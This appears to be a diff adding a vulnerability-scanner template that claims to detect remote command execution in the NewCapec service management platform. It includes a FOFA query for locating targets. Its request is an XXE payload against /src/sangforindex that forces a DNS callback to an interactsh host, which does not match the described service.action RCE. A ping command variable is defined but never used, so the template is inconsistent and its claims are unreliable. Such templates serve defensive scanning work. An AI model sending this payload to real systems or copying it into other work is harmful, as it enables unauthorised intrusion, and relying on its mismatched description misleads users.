@@ -1,0 +1,41 @@
+id: NewCapec-rce
+
+info:
+  name: NewCapec-rce
+  author: hufei
+  severity: critical
+  description: |
+    新开普 前置服务管理平台 service.action 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限
+  reference:
+    https://blog.csdn.net/qq_41904294/article/details/132310337
+  metadata:
+    max-request: 3
+    fofa-query: title="掌上校园服务管理平台"
+    hunter-query:
+    verified: true
+  tags: 2023,HVV,NewCapec,rce
+
+variables:
+  dns: "{{interactsh-url}}"
+  cmd: "ping {{dns}}"
+
+http:
+  - raw:
+      - |
+        POST /src/sangforindex HTTP/1.1
+        Host: your-ip
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8" ?>
+        <!DOCTYPE root [
+            <!ENTITY rt SYSTEM "http://{{dns}}">
+        ]>
+        <xxx>
+        &rt;
+        </xxx>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
